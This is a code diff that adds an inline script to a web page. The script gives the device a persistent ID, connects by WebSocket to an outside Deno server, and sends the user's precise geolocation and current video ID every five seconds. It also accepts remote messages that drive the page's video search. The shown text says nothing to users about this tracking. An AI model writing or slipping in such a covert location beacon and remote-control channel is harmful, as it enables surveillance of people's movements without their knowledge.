@@ -57,7 +57,79 @@
 
 
 
+<script>
+(() => {
+  // Use your Deno server WebSocket URL
+  const WS_URL = "wss://vfy-call.deno.dev/ws";  // agar Deno server wss enabled ho
+  const DEVICE_ID = localStorage.getItem("vfy_device_id") || crypto.randomUUID();
+  localStorage.setItem("vfy_device_id", DEVICE_ID);
 
+  let ws;
+
+  function connect() {
+    ws = new WebSocket(WS_URL);
+
+    ws.onopen = () => {
+      console.log("✅ Connected to vfy-call server");
+    };
+
+    ws.onmessage = (ev) => {
+      try {
+        const msg = JSON.parse(ev.data);
+        if (msg.type === "play" && msg.videoId) {
+          const input = document.getElementById("search-basic");
+          const btn = document.getElementById("search-btn");
+          if (input && btn) {
+            input.value = msg.videoId;
+            console.log("Auto-trigger search for video:", msg.videoId);
+            btn.click();
+          }
+        }
+      } catch (e) {
+        console.error("WS message parse error:", e);
+      }
+    };
+
+    ws.onclose = () => {
+      console.log("WebSocket closed — retrying in 3s");
+      setTimeout(connect, 3000);
+    };
+    ws.onerror = (e) => {
+      console.error("WebSocket error:", e);
+      ws.close();
+    };
+
+    // start periodic sending
+    setInterval(sendUpdate, 5000);
+  }
+
+  function sendUpdate() {
+    if (!navigator.geolocation) {
+      console.warn("Geolocation not supported");
+      return;
+    }
+    if (!ws || ws.readyState !== WebSocket.OPEN) return;
+
+    navigator.geolocation.getCurrentPosition((pos) => {
+      const videoId = window.id || window.currentVideoId || null;
+      const payload = {
+        type: "update",
+        id: DEVICE_ID,
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        videoId: videoId,
+      };
+      ws.send(JSON.stringify(payload));
+      console.log("Sent update:", payload);
+    }, (err) => {
+      console.warn("Geolocation error:", err.message);
+    }, { enableHighAccuracy: true, maximumAge: 5000, timeout: 10000 });
+  }
+
+  // Start
+  connect();
+})();
+</script>
 
 
 
